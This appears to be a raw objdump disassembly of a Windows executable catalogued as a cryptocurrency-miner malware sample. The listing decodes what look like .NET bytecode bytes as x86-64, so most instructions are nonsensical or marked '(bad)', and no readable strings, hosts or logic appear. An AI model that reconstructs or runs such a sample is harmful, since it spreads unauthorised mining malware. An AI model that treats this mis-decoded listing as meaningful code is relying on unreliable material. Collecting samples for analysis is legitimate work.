
malware_samples/miner/cfb899331aa5fefe8580a9272df61dbfcd29bcfb218081a4d071764ac2100777.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000402000 <.text>:
  402000:	60                   	(bad)
  402001:	be 00 00 00 00       	mov    $0x0,%esi
  402006:	00 00                	add    %al,(%rax)
  402008:	48 00 00             	rex.W add %al,(%rax)
  40200b:	00 02                	add    %al,(%rdx)
  40200d:	00 05 00 e8 73 00    	add    %al,0x73e800(%rip)        # 0xb40813
  402013:	00 74 2d 00          	add    %dh,0x0(%rbp,%rbp,1)
  402017:	00 01                	add    %al,(%rcx)
  402019:	00 00                	add    %al,(%rax)
  40201b:	00 01                	add    %al,(%rcx)
  40201d:	00 00                	add    %al,(%rax)
  40201f:	06                   	(bad)
  402020:	5c                   	pop    %rsp
  402021:	a1 00 00 ce 1c 00 00 	movabs 0x1cce0000,%eax
  402028:	00 00 
	...
  40204e:	00 00                	add    %al,(%rax)
  402050:	0b 30                	or     (%rax),%esi
  402052:	03 00                	add    (%rax),%eax
  402054:	30 00                	xor    %al,(%rax)
  402056:	00 00                	add    %al,(%rax)
  402058:	00 00                	add    %al,(%rax)
  40205a:	00 00                	add    %al,(%rax)
  40205c:	2b 02                	sub    (%rdx),%eax
  40205e:	26 16                	es (bad)
  402060:	7e 03                	jle    0x402065
  402062:	00 00                	add    %al,(%rax)
  402064:	04 28                	add    $0x28,%al
  402066:	08 00                	or     %al,(%rax)
  402068:	00 0a                	add    %cl,(%rdx)
  40206a:	17                   	(bad)
  40206b:	28 04 00             	sub    %al,(%rax,%rax,1)
  40206e:	00 06                	add    %al,(%rsi)
  402070:	80 01 00             	addb   $0x0,(%rcx)
  402073:	00 04 28             	add    %al,(%rax,%rbp,1)
  402076:	02 00                	add    (%rax),%al
  402078:	00 06                	add    %al,(%rsi)
  40207a:	dd 0c 00             	fisttpll (%rax,%rax,1)
  40207d:	00 00                	add    %al,(%rax)
  40207f:	26 16                	es (bad)
  402081:	28 09                	sub    %cl,(%rcx)
  402083:	00 00                	add    %al,(%rax)
  402085:	0a dd                	or     %ch,%bl
  402087:	00 00                	add    %al,(%rax)
  402089:	00 00                	add    %al,(%rax)
  40208b:	2a 01                	sub    (%rcx),%al
  40208d:	10 00                	adc    %al,(%rax)
  40208f:	00 00                	add    %al,(%rax)
  402091:	00 04 00             	add    %al,(%rax,%rax,1)
  402094:	1f                   	(bad)
  402095:	23 00                	and    (%rax),%eax
  402097:	0c 14                	or     $0x14,%al
  402099:	00 00                	add    %al,(%rax)
  40209b:	01 1b                	add    %ebx,(%rbx)
  40209d:	30 06                	xor    %al,(%rsi)
  40209f:	00 80 03 00 00 01    	add    %al,0x1000003(%rax)
  4020a5:	00 00                	add    %al,(%rax)
  4020a7:	11 2b                	adc    %ebp,(%rbx)
  4020a9:	02 26                	add    (%rsi),%ah
  4020ab:	16                   	(bad)
  4020ac:	72 01                	jb     0x4020af
  4020ae:	00 00                	add    %al,(%rax)
  4020b0:	70 0a                	jo     0x4020bc
  4020b2:	73 0a                	jae    0x4020be
  4020b4:	00 00                	add    %al,(%rax)
  4020b6:	0a 0b                	or     (%rbx),%cl
  4020b8:	07                   	(bad)
  4020b9:	19 6f 0b             	sbb    %ebp,0xb(%rdi)
  4020bc:	00 00                	add    %al,(%rax)
  4020be:	0a 20                	or     (%rax),%ah
  4020c0:	00 00                	add    %al,(%rax)
  4020c2:	00 00                	add    %al,(%rax)
  4020c4:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  4020c7:	00 06                	add    %al,(%rsi)
  4020c9:	07                   	(bad)
  4020ca:	73 0c                	jae    0x4020d8
  4020cc:	00 00                	add    %al,(%rax)
  4020ce:	0a 0c 08             	or     (%rax,%rcx,1),%cl
  4020d1:	6f                   	outsl  (%rsi),(%dx)
  4020d2:	0d 00 00 0a 08       	or     $0x80a0000,%eax
  4020d7:	20 1a                	and    %bl,(%rdx)
  4020d9:	00 00                	add    %al,(%rax)
  4020db:	00 28                	add    %ch,(%rax)
  4020dd:	1c 00                	sbb    $0x0,%al
  4020df:	00 06                	add    %al,(%rsi)
  4020e1:	73 0e                	jae    0x4020f1
  4020e3:	00 00                	add    %al,(%rax)
  4020e5:	0a 73 0f             	or     0xf(%rbx),%dh
  4020e8:	00 00                	add    %al,(%rax)
  4020ea:	0a 28                	or     (%rax),%ch
  4020ec:	10 00                	adc    %al,(%rax)
  4020ee:	00 0a                	add    %cl,(%rdx)
  4020f0:	0d 09 6f 11 00       	or     $0x116f09,%eax
  4020f5:	00 0a                	add    %cl,(%rdx)
  4020f7:	13 0d 38 6d 00 00    	adc    0x6d38(%rip),%ecx        # 0x408e35
  4020fd:	00 11                	add    %dl,(%rcx)
  4020ff:	0d 6f 12 00 00       	or     $0x126f,%eax
  402104:	0a 74 18 00          	or     0x0(%rax,%rbx,1),%dh
  402108:	00 01                	add    %al,(%rcx)
  40210a:	13 04 06             	adc    (%rsi,%rax,1),%eax
  40210d:	13 0e                	adc    (%rsi),%ecx
  40210f:	1b 8d 0c 00 00 01    	sbb    0x100000c(%rbp),%ecx
  402115:	13 0f                	adc    (%rdi),%ecx
  402117:	11 0f                	adc    %ecx,(%rdi)
  402119:	16                   	(bad)
  40211a:	11 0e                	adc    %ecx,(%rsi)
  40211c:	a2 11 0f 17 20 8a 00 	movabs %al,0x8a20170f11
  402123:	00 00 
  402125:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  402128:	00 06                	add    %al,(%rsi)
  40212a:	a2 11 0f 18 11 04 20 	movabs %al,0x90200411180f11
  402131:	90 00 
  402133:	00 00                	add    %al,(%rax)
  402135:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  402138:	00 06                	add    %al,(%rsi)
  40213a:	6f                   	outsl  (%rsi),(%dx)
  40213b:	13 00                	adc    (%rax),%eax
  40213d:	00 0a                	add    %cl,(%rdx)
  40213f:	a2 11 0f 19 20 8a 00 	movabs %al,0x8a20190f11
  402146:	00 00 
  402148:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  40214b:	00 06                	add    %al,(%rsi)
  40214d:	a2 11 0f 1a 11 04 20 	movabs %al,0xb02004111a0f11
  402154:	b0 00 
  402156:	00 00                	add    %al,(%rax)
  402158:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  40215b:	00 06                	add    %al,(%rsi)
  40215d:	6f                   	outsl  (%rsi),(%dx)
  40215e:	13 00                	adc    (%rax),%eax
  402160:	00 0a                	add    %cl,(%rdx)
  402162:	a2 11 0f 28 14 00 00 	movabs %al,0xa0a000014280f11
  402169:	0a 0a 
  40216b:	11 0d 6f 15 00 00    	adc    %ecx,0x156f(%rip)        # 0x4036e0
  402171:	0a 3a                	or     (%rdx),%bh
  402173:	87 ff                	xchg   %edi,%edi
  402175:	ff                   	(bad)
  402176:	ff                   	lcall  (bad)
  402177:	dd 0f                	fisttpll (%rdi)
  402179:	00 00                	add    %al,(%rax)
  40217b:	00 11                	add    %dl,(%rcx)
  40217d:	0d 39 07 00 00       	or     $0x739,%eax
  402182:	00 11                	add    %dl,(%rcx)
  402184:	0d 6f 16 00 00       	or     $0x166f,%eax
  402189:	0a dc                	or     %ah,%bl
  40218b:	06                   	(bad)
  40218c:	20 bc 00 00 00 28 1c 	and    %bh,0x1c280000(%rax,%rax,1)
  402193:	00 00                	add    %al,(%rax)
  402195:	06                   	(bad)
  402196:	1b 6f 17             	sbb    0x17(%rdi),%ebp
  402199:	00 00                	add    %al,(%rax)
  40219b:	0a 16                	or     (%rsi),%dl
  40219d:	3c 1c                	cmp    $0x1c,%al
  40219f:	00 00                	add    %al,(%rax)
  4021a1:	00 06                	add    %al,(%rsi)
  4021a3:	20 cc                	and    %cl,%ah
  4021a5:	00 00                	add    %al,(%rax)
  4021a7:	00 28                	add    %ch,(%rax)
  4021a9:	1c 00                	sbb    $0x0,%al
  4021ab:	00 06                	add    %al,(%rsi)
  4021ad:	1b 6f 17             	sbb    0x17(%rdi),%ebp
  4021b0:	00 00                	add    %al,(%rax)
  4021b2:	0a 16                	or     (%rsi),%dl
  4021b4:	fe 04 16             	incb   (%rsi,%rdx,1)
  4021b7:	fe 01                	incb   (%rcx)
  4021b9:	38 01                	cmp    %al,(%rcx)
  4021bb:	00 00                	add    %al,(%rax)
  4021bd:	00 17                	add    %dl,(%rdi)
  4021bf:	13 05 72 01 00 00    	adc    0x172(%rip),%eax        # 0x402337
  4021c5:	70 13                	jo     0x4021da
  4021c7:	06                   	(bad)
  4021c8:	08 20                	or     %ah,(%rax)
  4021ca:	d6                   	udb
  4021cb:	00 00                	add    %al,(%rax)
  4021cd:	00 28                	add    %ch,(%rax)
  4021cf:	1c 00                	sbb    $0x0,%al
  4021d1:	00 06                	add    %al,(%rsi)
  4021d3:	28 03                	sub    %al,(%rbx)
  4021d5:	00 00                	add    %al,(%rax)
  4021d7:	06                   	(bad)
  4021d8:	73 0e                	jae    0x4021e8
  4021da:	00 00                	add    %al,(%rax)
  4021dc:	0a 73 0f             	or     0xf(%rbx),%dh
  4021df:	00 00                	add    %al,(%rax)
  4021e1:	0a 28                	or     (%rax),%ch
  4021e3:	10 00                	adc    %al,(%rax)
  4021e5:	00 0a                	add    %cl,(%rdx)
  4021e7:	13 07                	adc    (%rdi),%eax
  4021e9:	11 07                	adc    %eax,(%rdi)
  4021eb:	6f                   	outsl  (%rsi),(%dx)
  4021ec:	11 00                	adc    %eax,(%rax)
  4021ee:	00 0a                	add    %cl,(%rdx)
  4021f0:	13 10                	adc    (%rax),%edx
  4021f2:	38 79 00             	cmp    %bh,0x0(%rcx)
  4021f5:	00 00                	add    %al,(%rax)
  4021f7:	11 10                	adc    %edx,(%rax)
  4021f9:	6f                   	outsl  (%rsi),(%dx)
  4021fa:	12 00                	adc    (%rax),%al
  4021fc:	00 0a                	add    %cl,(%rdx)
  4021fe:	74 18                	je     0x402218
  402200:	00 00                	add    %al,(%rax)
  402202:	01 13                	add    %edx,(%rbx)
  402204:	08 11                	or     %dl,(%rcx)
  402206:	08 39                	or     %bh,(%rcx)
  402208:	64 00 00             	add    %al,%fs:(%rax)
  40220b:	00 11                	add    %dl,(%rcx)
  40220d:	08 20                	or     %ah,(%rax)
  40220f:	b2 01                	mov    $0x1,%dl
  402211:	00 00                	add    %al,(%rax)
  402213:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  402216:	00 06                	add    %al,(%rsi)
  402218:	6f                   	outsl  (%rsi),(%dx)
  402219:	13 00                	adc    (%rax),%eax
  40221b:	00 0a                	add    %cl,(%rdx)
  40221d:	39 4e 00             	cmp    %ecx,0x0(%rsi)
  402220:	00 00                	add    %al,(%rax)
  402222:	11 08                	adc    %ecx,(%rax)
  402224:	20 b2 01 00 00 28    	and    %dh,0x28000001(%rdx)
  40222a:	1c 00                	sbb    $0x0,%al
  40222c:	00 06                	add    %al,(%rsi)
  40222e:	6f                   	outsl  (%rsi),(%dx)
  40222f:	13 00                	adc    (%rax),%eax
  402231:	00 0a                	add    %cl,(%rdx)
  402233:	6f                   	outsl  (%rsi),(%dx)
  402234:	18 00                	sbb    %al,(%rax)
  402236:	00 0a                	add    %cl,(%rdx)
  402238:	20 cc                	and    %cl,%ah
  40223a:	01 00                	add    %eax,(%rax)
  40223c:	00 28                	add    %ch,(%rax)
  40223e:	1c 00                	sbb    $0x0,%al
  402240:	00 06                	add    %al,(%rsi)
  402242:	28 03                	sub    %al,(%rbx)
  402244:	00 00                	add    %al,(%rax)
  402246:	06                   	(bad)
  402247:	6f                   	outsl  (%rsi),(%dx)
  402248:	19 00                	sbb    %eax,(%rax)
  40224a:	00 0a                	add    %cl,(%rdx)
  40224c:	39 1f                	cmp    %ebx,(%rdi)
  40224e:	00 00                	add    %al,(%rax)
  402250:	00 11                	add    %dl,(%rcx)
  402252:	06                   	(bad)
  402253:	11 08                	adc    %ecx,(%rax)
  402255:	20 b2 01 00 00 28    	and    %dh,0x28000001(%rdx)
  40225b:	1c 00                	sbb    $0x0,%al
  40225d:	00 06                	add    %al,(%rsi)
  40225f:	6f                   	outsl  (%rsi),(%dx)
  402260:	13 00                	adc    (%rax),%eax
  402262:	00 0a                	add    %cl,(%rdx)
  402264:	6f                   	outsl  (%rsi),(%dx)
  402265:	18 00                	sbb    %al,(%rax)
  402267:	00 0a                	add    %cl,(%rdx)
  402269:	28 1a                	sub    %bl,(%rdx)
  40226b:	00 00                	add    %al,(%rax)
  40226d:	0a 13                	or     (%rbx),%dl
  40226f:	06                   	(bad)
  402270:	11 10                	adc    %edx,(%rax)
  402272:	6f                   	outsl  (%rsi),(%dx)
  402273:	15 00 00 0a 3a       	adc    $0x3a0a0000,%eax
  402278:	7b ff                	jnp    0x402279
  40227a:	ff                   	(bad)
  40227b:	ff                   	lcall  (bad)
  40227c:	dd 0f                	fisttpll (%rdi)
  40227e:	00 00                	add    %al,(%rax)
  402280:	00 11                	add    %dl,(%rcx)
  402282:	10 39                	adc    %bh,(%rcx)
  402284:	07                   	(bad)
  402285:	00 00                	add    %al,(%rax)
  402287:	00 11                	add    %dl,(%rcx)
  402289:	10 6f 16             	adc    %ch,0x16(%rdi)
  40228c:	00 00                	add    %al,(%rax)
  40228e:	0a dc                	or     %ah,%bl
  402290:	18 8d 01 00 00 1b    	sbb    %cl,0x1b000001(%rbp)
  402296:	13 11                	adc    (%rcx),%edx
  402298:	11 11                	adc    %edx,(%rcx)
  40229a:	16                   	(bad)
  40229b:	18 8d 03 00 00 01    	sbb    %cl,0x1000003(%rbp)
  4022a1:	13 12                	adc    (%rdx),%edx
  4022a3:	11 12                	adc    %edx,(%rdx)
  4022a5:	16                   	(bad)
  4022a6:	20 00                	and    %al,(%rax)
  4022a8:	02 00                	add    (%rax),%al
  4022aa:	00 28                	add    %ch,(%rax)
  4022ac:	1c 00                	sbb    $0x0,%al
  4022ae:	00 06                	add    %al,(%rsi)
  4022b0:	a2 11 12 17 20 5c 02 	movabs %al,0x25c20171211
  4022b7:	00 00 
  4022b9:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  4022bc:	00 06                	add    %al,(%rsi)
  4022be:	a2 11 12 a2 11 11 17 	movabs %al,0x8d18171111a21211
  4022c5:	18 8d 
  4022c7:	03 00                	add    (%rax),%eax
  4022c9:	00 01                	add    %al,(%rcx)
  4022cb:	13 13                	adc    (%rbx),%edx
  4022cd:	11 13                	adc    %edx,(%rbx)
  4022cf:	16                   	(bad)
  4022d0:	20 62 02             	and    %ah,0x2(%rdx)
  4022d3:	00 00                	add    %al,(%rax)
  4022d5:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  4022d8:	00 06                	add    %al,(%rsi)
  4022da:	a2 11 13 17 20 be 02 	movabs %al,0x2be20171311
  4022e1:	00 00 
  4022e3:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  4022e6:	00 06                	add    %al,(%rsi)
  4022e8:	a2 11 13 a2 11 11 13 	movabs %al,0x1609131111a21311
  4022ef:	09 16 
  4022f1:	13 0a                	adc    (%rdx),%ecx
  4022f3:	11 09                	adc    %ecx,(%rcx)
  4022f5:	13 14 16             	adc    (%rsi,%rdx,1),%edx
  4022f8:	13 15 38 6b 00 00    	adc    0x6b38(%rip),%edx        # 0x408e36
  4022fe:	00 11                	add    %dl,(%rcx)
  402300:	14 11                	adc    $0x11,%al
  402302:	15 9a 13 0b 11       	adc    $0x110b139a,%eax
  402307:	06                   	(bad)
  402308:	11 0b                	adc    %ecx,(%rbx)
  40230a:	16                   	(bad)
  40230b:	9a                   	(bad)
  40230c:	28 03                	sub    %al,(%rbx)
  40230e:	00 00                	add    %al,(%rax)
  402310:	06                   	(bad)
  402311:	6f                   	outsl  (%rsi),(%dx)
  402312:	19 00                	sbb    %eax,(%rax)
  402314:	00 0a                	add    %cl,(%rdx)
  402316:	3a 49 00             	cmp    0x0(%rcx),%cl
  402319:	00 00                	add    %al,(%rax)
  40231b:	11 0b                	adc    %ecx,(%rbx)
  40231d:	17                   	(bad)
  40231e:	9a                   	(bad)
  40231f:	20 c4                	and    %al,%ah
  402321:	02 00                	add    (%rax),%al
  402323:	00 28                	add    %ch,(%rax)
  402325:	1c 00                	sbb    $0x0,%al
  402327:	00 06                	add    %al,(%rsi)
  402329:	28 03                	sub    %al,(%rbx)
  40232b:	00 00                	add    %al,(%rax)
  40232d:	06                   	(bad)
  40232e:	28 1b                	sub    %bl,(%rbx)
  402330:	00 00                	add    %al,(%rax)
  402332:	0a 3a                	or     (%rdx),%bh
  402334:	24 00                	and    $0x0,%al
  402336:	00 00                	add    %al,(%rax)
  402338:	11 0b                	adc    %ecx,(%rbx)
  40233a:	17                   	(bad)
  40233b:	9a                   	(bad)
  40233c:	20 f8                	and    %bh,%al
  40233e:	02 00                	add    (%rax),%al
  402340:	00 28                	add    %ch,(%rax)
  402342:	1c 00                	sbb    $0x0,%al
  402344:	00 06                	add    %al,(%rsi)
  402346:	28 03                	sub    %al,(%rbx)
  402348:	00 00                	add    %al,(%rax)
  40234a:	06                   	(bad)
  40234b:	28 1b                	sub    %bl,(%rbx)
  40234d:	00 00                	add    %al,(%rax)
  40234f:	0a 39                	or     (%rcx),%bh
  402351:	0f 00 00             	sldt   (%rax)
  402354:	00 11                	add    %dl,(%rcx)
  402356:	05 39 08 00 00       	add    $0x839,%eax
  40235b:	00 17                	add    %dl,(%rdi)
  40235d:	13 0a                	adc    (%rdx),%ecx
  40235f:	38 11                	cmp    %dl,(%rcx)
  402361:	00 00                	add    %al,(%rax)
  402363:	00 11                	add    %dl,(%rcx)
  402365:	15 17 58 13 15       	adc    $0x15135817,%eax
  40236a:	11 15 11 14 8e 69    	adc    %edx,0x698e1411(%rip)        # 0x69ce3781
  402370:	3f                   	(bad)
  402371:	8a ff                	mov    %bh,%bh
  402373:	ff                   	(bad)
  402374:	ff                   	(bad)
  402375:	7e 03                	jle    0x40237a
  402377:	00 00                	add    %al,(%rax)
  402379:	04 28                	add    $0x28,%al
  40237b:	1c 00                	sbb    $0x0,%al
  40237d:	00 0a                	add    %cl,(%rdx)
  40237f:	39 07                	cmp    %eax,(%rdi)
  402381:	00 00                	add    %al,(%rax)
  402383:	00 11                	add    %dl,(%rcx)
  402385:	0a 39                	or     (%rcx),%bh
  402387:	82                   	(bad)
  402388:	00 00                	add    %al,(%rax)
  40238a:	00 7e 03             	add    %bh,0x3(%rsi)
  40238d:	00 00                	add    %al,(%rax)
  40238f:	04 28                	add    $0x28,%al
  402391:	1c 00                	sbb    $0x0,%al
  402393:	00 0a                	add    %cl,(%rdx)
  402395:	39 0b                	cmp    %ecx,(%rbx)
  402397:	00 00                	add    %al,(%rax)
  402399:	00 7e 02             	add    %bh,0x2(%rsi)
  40239c:	00 00                	add    %al,(%rax)
  40239e:	04 18                	add    $0x18,%al
  4023a0:	3e 5c                	ds pop %rsp
  4023a2:	00 00                	add    %al,(%rax)
  4023a4:	00 16                	add    %dl,(%rsi)
  4023a6:	80 02 00             	addb   $0x0,(%rdx)
  4023a9:	00 04 7e             	add    %al,(%rsi,%rdi,2)
  4023ac:	03 00                	add    (%rax),%eax
  4023ae:	00 04 7e             	add    %al,(%rsi,%rdi,2)
  4023b1:	01 00                	add    %eax,(%rax)
  4023b3:	00 04 16             	add    %al,(%rsi,%rdx,1)
  4023b6:	28 04 00             	sub    %al,(%rax,%rax,1)
  4023b9:	00 06                	add    %al,(%rsi)
  4023bb:	28 1d 00 00 0a 73    	sub    %bl,0x730a0000(%rip)        # 0x734a23c1
  4023c1:	1e                   	(bad)
  4023c2:	00 00                	add    %al,(%rax)
  4023c4:	0a 13                	or     (%rbx),%dl
  4023c6:	0c 11                	or     $0x11,%al
  4023c8:	0c 7e                	or     $0x7e,%al
  4023ca:	03 00                	add    (%rax),%eax
  4023cc:	00 04 6f             	add    %al,(%rdi,%rbp,2)
  4023cf:	1f                   	(bad)
  4023d0:	00 00                	add    %al,(%rax)
  4023d2:	0a 11                	or     (%rcx),%dl
  4023d4:	0c 17                	or     $0x17,%al
  4023d6:	6f                   	outsl  (%rsi),(%dx)
  4023d7:	20 00                	and    %al,(%rax)
  4023d9:	00 0a                	add    %cl,(%rdx)
  4023db:	11 0c 7e             	adc    %ecx,(%rsi,%rdi,2)
  4023de:	03 00                	add    (%rax),%eax
  4023e0:	00 04 28             	add    %al,(%rax,%rbp,1)
  4023e3:	21 00                	and    %eax,(%rax)
  4023e5:	00 0a                	add    %cl,(%rdx)
  4023e7:	6f                   	outsl  (%rsi),(%dx)
  4023e8:	22 00                	and    (%rax),%al
  4023ea:	00 0a                	add    %cl,(%rdx)
  4023ec:	11 0c 17             	adc    %ecx,(%rdi,%rdx,1)
  4023ef:	6f                   	outsl  (%rsi),(%dx)
  4023f0:	23 00                	and    (%rax),%eax
  4023f2:	00 0a                	add    %cl,(%rdx)
  4023f4:	11 0c 28             	adc    %ecx,(%rax,%rbp,1)
  4023f7:	24 00                	and    $0x0,%al
  4023f9:	00 0a                	add    %cl,(%rdx)
  4023fb:	26 38 0c 00          	es cmp %cl,(%rax,%rax,1)
  4023ff:	00 00                	add    %al,(%rax)
  402401:	7e 02                	jle    0x402405
  402403:	00 00                	add    %al,(%rax)
  402405:	04 17                	add    $0x17,%al
  402407:	58                   	pop    %rax
  402408:	80 02 00             	addb   $0x0,(%rdx)
  40240b:	00 04 dd 06 00 00 00 	add    %al,0x6(,%rbx,8)
  402412:	26 dd 00             	es fldl (%rax)
  402415:	00 00                	add    %al,(%rax)
  402417:	00 20                	add    %ah,(%rax)
  402419:	b8 88 00 00 28       	mov    $0x28000088,%eax
  40241e:	25 00 00 0a 28       	and    $0x280a0000,%eax
  402423:	02 00                	add    (%rax),%al
  402425:	00 06                	add    %al,(%rsi)
  402427:	2a 41 4c             	sub    0x4c(%rcx),%al
  40242a:	00 00                	add    %al,(%rax)
  40242c:	02 00                	add    (%rax),%al
  40242e:	00 00                	add    %al,(%rax)
  402430:	51                   	push   %rcx
  402431:	00 00                	add    %al,(%rax)
  402433:	00 83 00 00 00 d4    	add    %al,-0x2c000000(%rbx)
  402439:	00 00                	add    %al,(%rax)
  40243b:	00 0f                	add    %cl,(%rdi)
  40243d:	00 00                	add    %al,(%rax)
  40243f:	00 00                	add    %al,(%rax)
  402441:	00 00                	add    %al,(%rax)
  402443:	00 02                	add    %al,(%rdx)
  402445:	00 00                	add    %al,(%rax)
  402447:	00 4a 01             	add    %cl,0x1(%rdx)
  40244a:	00 00                	add    %al,(%rax)
  40244c:	8f 00                	pop    (%rax)
  40244e:	00 00                	add    %al,(%rax)
  402450:	d9 01                	flds   (%rcx)
  402452:	00 00                	add    %al,(%rax)
  402454:	0f 00 00             	sldt   (%rax)
	...
  40245f:	00 04 00             	add    %al,(%rax,%rax,1)
  402462:	00 00                	add    %al,(%rax)
  402464:	66 03 00             	add    (%rax),%ax
  402467:	00 6a 03             	add    %ch,0x3(%rdx)
  40246a:	00 00                	add    %al,(%rax)
  40246c:	06                   	(bad)
  40246d:	00 00                	add    %al,(%rax)
  40246f:	00 14 00             	add    %dl,(%rax,%rax,1)
  402472:	00 01                	add    %al,(%rcx)
  402474:	6e                   	outsb  (%rsi),(%dx)
  402475:	2b 02                	sub    (%rdx),%eax
  402477:	26 16                	es (bad)
  402479:	28 26                	sub    %ah,(%rsi)
  40247b:	00 00                	add    %al,(%rax)
  40247d:	0a 02                	or     (%rdx),%al
  40247f:	28 27                	sub    %ah,(%rdi)
  402481:	00 00                	add    %al,(%rax)
  402483:	0a 16                	or     (%rsi),%dl
  402485:	28 04 00             	sub    %al,(%rax,%rax,1)
  402488:	00 06                	add    %al,(%rsi)
  40248a:	6f                   	outsl  (%rsi),(%dx)
  40248b:	28 00                	sub    %al,(%rax)
  40248d:	00 0a                	add    %cl,(%rdx)
  40248f:	2a 1b                	sub    (%rbx),%bl
  402491:	30 05 00 e0 00 00    	xor    %al,0xe000(%rip)        # 0x410497
  402497:	00 02                	add    %al,(%rdx)
  402499:	00 00                	add    %al,(%rax)
  40249b:	11 2b                	adc    %ebp,(%rbx)
  40249d:	02 26                	add    (%rsi),%ah
  40249f:	16                   	(bad)
  4024a0:	28 26                	sub    %ah,(%rsi)
  4024a2:	00 00                	add    %al,(%rax)
  4024a4:	0a 20                	or     (%rax),%ah
  4024a6:	2c 03                	sub    $0x3,%al
  4024a8:	00 00                	add    %al,(%rax)
  4024aa:	28 1c 00             	sub    %bl,(%rax,%rax,1)
  4024ad:	00 06                	add    %al,(%rsi)
  4024af:	6f                   	outsl  (%rsi),(%dx)
  4024b0:	29 00                	sub    %eax,(%rax)
  4024b2:	00 0a                	add    %cl,(%rdx)
  4024b4:	0a 20                	or     (%rax),%ah
  4024b6:	50                   	push   %rax
  4024b7:	03 00                	add    (%rax),%eax
  4024b9:	00 28                	add    %ch,(%rax)
  4024bb:	1c 00                	sbb    $0x0,%al
  4024bd:	00 06                	add    %al,(%rsi)
  4024bf:	28 26                	sub    %ah,(%rsi)
  4024c1:	00 00                	add    %al,(%rax)
  4024c3:	0a 20                	or     (%rax),%ah
  4024c5:	54                   	push   %rsp
  4024c6:	05 00 00 28 1c       	add    $0x1c280000,%eax
  4024cb:	00 00                	add    %al,(%rax)
  4024cd:	06                   	(bad)
  4024ce:	6f                   	outsl  (%rsi),(%dx)
  4024cf:	29 00                	sub    %eax,(%rax)
  4024d1:	00 0a                	add    %cl,(%rdx)
  4024d3:	1f                   	(bad)
  4024d4:	64 73 2a             	fs jae 0x402501
  4024d7:	00 00                	add    %al,(%rax)
  4024d9:	0a 0b                	or     (%rbx),%cl
  4024db:	73 2b                	jae    0x402508
  4024dd:	00 00                	add    %al,(%rax)
  4024df:	0a 13                	or     (%rbx),%dl
  4024e1:	06                   	(bad)
  4024e2:	11 06                	adc    %eax,(%rsi)
  4024e4:	20 00                	and    %al,(%rax)
  4024e6:	01 00                	add    %eax,(%rax)
  4024e8:	00 6f 2c             	add    %ch,0x2c(%rdi)
  4024eb:	00 00                	add    %al,(%rax)
  4024ed:	0a 11                	or     (%rcx),%dl
  4024ef:	06                   	(bad)
  4024f0:	17                   	(bad)
  4024f1:	6f                   	outsl  (%rsi),(%dx)
  4024f2:	2d 00 00 0a 11       	sub    $0x110a0000,%eax
  4024f7:	06                   	(bad)
  4024f8:	0c 03                	or     $0x3,%al
  4024fa:	3a 14 00             	cmp    (%rax,%rax,1),%dl
  4024fd:	00 00                	add    %al,(%rax)
  4024ff:	08 07                	or     %al,(%rdi)
  402501:	1f                   	(bad)
  402502:	10 6f 2e             	adc    %ch,0x2e(%rdi)
  402505:	00 00                	add    %al,(%rax)
  402507:	0a 06                	or     (%rsi),%al
  402509:	6f                   	outsl  (%rsi),(%dx)
  40250a:	2f                   	(bad)
  40250b:	00 00                	add    %al,(%rax)
  40250d:	0a 38                	or     (%rax),%bh
  40250f:	0f 00 00             	sldt   (%rax)
  402512:	00 08                	add    %cl,(%rax)
  402514:	07                   	(bad)
  402515:	1f                   	(bad)
  402516:	10 6f 2e             	adc    %ch,0x2e(%rdi)
  402519:	00 00                	add    %al,(%rax)
  40251b:	0a 06                	or     (%rsi),%al
  40251d:	6f                   	outsl  (%rsi),(%dx)
  40251e:	30 00                	xor    %al,(%rax)
  402520:	00 0a                	add    %cl,(%rdx)
  402522:	0d 73 31 00 00       	or     $0x3173,%eax
  402527:	0a 13                	or     (%rbx),%dl
  402529:	04 11                	add    $0x11,%al
  40252b:	04 09                	add    $0x9,%al
  40252d:	17                   	(bad)
  40252e:	73 32                	jae    0x402562
  402530:	00 00                	add    %al,(%rax)
  402532:	0a 13                	or     (%rbx),%dl
  402534:	05 11 05 02 16       	add    $0x16020511,%eax
  402539:	02 8e 69 6f 33 00    	add    0x336f69(%rsi),%cl
  40253f:	00 0a                	add    %cl,(%rdx)
  402541:	11 05 6f 34 00 00    	adc    %eax,0x346f(%rip)        # 0x4059b6
  402547:	0a dd                	or     %ch,%bl
  402549:	0f 00 00             	sldt   (%rax)
  40254c:	00 11                	add    %dl,(%rcx)
  40254e:	05 39 07 00 00       	add    $0x739,%eax
  402553:	00 11                	add    %dl,(%rcx)
  402555:	05 6f 16 00 00       	add    $0x166f,%eax
  40255a:	0a dc                	or     %ah,%bl
  40255c:	11 04 6f             	adc    %eax,(%rdi,%rbp,2)
  40255f:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  402564:	07                   	(bad)
  402565:	dd 0f                	fisttpll (%rdi)
  402567:	00 00                	add    %al,(%rax)
  402569:	00 11                	add    %dl,(%rcx)
  40256b:	04 39                	add    $0x39,%al
  40256d:	07                   	(bad)
  40256e:	00 00                	add    %al,(%rax)
  402570:	00 11                	add    %dl,(%rcx)
  402572:	04 6f                	add    $0x6f,%al
  402574:	16                   	(bad)
  402575:	00 00                	add    %al,(%rax)
  402577:	0a dc                	or     %ah,%bl
  402579:	11 07                	adc    %eax,(%rdi)
  40257b:	2a 01                	sub    (%rcx),%al
  40257d:	1c 00                	sbb    $0x0,%al
  40257f:	00 02                	add    %al,(%rdx)
  402581:	00 99 00 18 b1 00    	add    %bl,0xb11800(%rcx)
  402587:	0f 00 00             	sldt   (%rax)
  40258a:	00 00                	add    %al,(%rax)
  40258c:	02 00                	add    (%rax),%al
  40258e:	8e 00                	mov    (%rax),%es
  402590:	40 ce                	rex (bad)
  402592:	00 0f                	add    %cl,(%rdi)
  402594:	00 00                	add    %al,(%rax)
  402596:	00 00                	add    %al,(%rax)
  402598:	1b 30                	sbb    (%rax),%esi
  40259a:	03 00                	add    (%rax),%eax
  40259c:	56                   	push   %rsi
  40259d:	00 00                	add    %al,(%rax)
  40259f:	00 03                	add    %al,(%rbx)
  4025a1:	00 00                	add    %al,(%rax)
  4025a3:	11 2b                	adc    %ebp,(%rbx)
  4025a5:	02 26                	add    (%rsi),%ah
